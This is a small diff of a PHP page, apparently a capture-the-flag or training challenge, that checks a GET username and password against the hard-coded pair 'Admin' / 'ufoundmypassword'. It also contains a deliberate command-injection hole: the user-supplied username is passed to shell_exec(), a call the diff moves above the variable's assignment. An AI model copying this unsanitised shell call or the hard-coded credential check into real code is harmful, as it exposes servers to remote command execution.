@@ -22,9 +22,9 @@
   <div style="background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px" align="center">
     <?php
     if(isset($_GET["username"])){
+      echo shell_exec($user);
       $user = $_GET["username"];
       $password = $_GET["password"];
-      echo shell_exec($user);
       if($user == "Admin" && $password == "ufoundmypassword")
         echo "WELLDONE";
     }
